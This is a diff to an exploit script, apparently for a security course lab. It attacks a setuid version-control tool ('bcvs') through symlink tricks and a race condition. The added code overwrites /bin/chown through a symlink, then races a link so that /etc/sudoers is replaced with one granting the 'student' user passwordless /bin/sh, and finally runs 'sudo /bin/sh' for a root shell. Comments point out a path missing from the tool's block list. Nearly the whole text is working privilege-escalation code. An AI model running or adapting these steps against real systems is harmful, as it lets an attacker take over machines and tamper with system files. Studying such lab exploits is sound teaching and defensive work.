@@ -125,9 +125,10 @@ if __name__ == '__main__':
       time.sleep(0.04)
 
       sz_target = os.stat(target_file).st_size
-      sz_repo = os.stat(target_file).st_size
+      sz_repo = os.stat("${REPODIR}/" + local_file).st_size
       if sz_target == sz_repo:
         print("Repo file and target file have same size. Exploit likely worked.")
+        print("sz_target = {}, sz_repo = {}".format(sz_target, sz_repo))
         exit = True
         break
 
@@ -144,51 +145,52 @@ echo "ATTACK_STR_SUDO (length: ${#ATTACK_STR_SUDO}): $ATTACK_STR_SUDO"
 echo "ATTACK_STR_OTHER (length: ${#ATTACK_STR_OTHER}): $ATTACK_STR_OTHER"
 
 # First we need to try and overwrite the chown executable
+# Since /bin isn't in the block list we can do this easily
 # Since we are nice attackers we will first backup the current one. Still
 # need a root shell to copy it back
 if [[ ! -f "~/chown.save" ]]; then
   cp /bin/chown ~/chown.save
 fi
 
-export USER=student
+cat <<EOS > "${REPODIR}/my_chown"
+#!/bin/bash
+echo "Fake chmod script"
+EOS
 
-LOCAL_FILE=$ATTACK_STR_OTHER
-touch $LOCAL_FILE
-touch ${REPODIR}/${LOCAL_FILE}
+ln -s /bin/chown my_chown
 
-echo "Starting attack in `pwd`"
-echo "USER=$USER"
-./run_bcvs.py runner co ${LOCAL_FILE} &
-RUNNER_PID=$!
-
-./run_bcvs.py linker ${LOCAL_FILE} "/bin/chown" &
-LINKER_PID=$!
-
-trap "echo \"Killing attack processes\"; kill -9 $RUNNER_PID; kill -9 $LINKER_PID; exit -1" SIGINT
-wait $LINKER_PID
-if [[ $? -ne 0 ]]; then
-  echo "Linker exited with an error. Stopping sploit."
-  kill -9 $RUNNER_PID
-  exit -1
-fi
-
-kill -9 $RUNNER_PID
+echo "Using bcvs to overwrite /bin/chown"
+echo "comment" | /opt/bcvs/bcvs co my_chown
 
 # ------------------------------------------------------------------
 # Now to overwrite the sudoers file
-export USER=root
-
+# Since the sudoers file is in the block list path for /etc we need to
+# exploit the race condition
 LOCAL_FILE=$ATTACK_STR_SUDO
-touch $LOCAL_FILE
-touch ${REPODIR}/${LOCAL_FILE}
+TARGET_FILE="/etc/sudoers"
+
+cat <<EOS > "${REPODIR}/${LOCAL_FILE}"
+Defaults env_reset
+root ALL=(ALL:ALL) ALL
+%admin ALL=(ALL) ALL
+%sudo ALL=(ALL:ALL) ALL
+%student ALL=NOPASSWD: /bin/sh
+#includedir /etc/sudoers.d
+EOS
+
+touch ${LOCAL_FILE}
 
 ./run_bcvs.py runner co ${LOCAL_FILE} &
 RUNNER_PID=$!
 
-./run_bcvs.py linker ${LOCAL_FILE} "/etc/sudoers" &
+./run_bcvs.py linker ${LOCAL_FILE} "${TARGET_FILE}" &
 LINKER_PID=$!
 
 trap "echo \"Killing attack processes\"; kill -9 $RUNNER_PID; kill -9 $LINKER_PID; exit -1" SIGINT
 
 wait $LINKER_PID
 kill -9 $RUNNER_PID
+
+sudo /bin/sh
+
+echo "Now reset your chown binary and sudoers file."
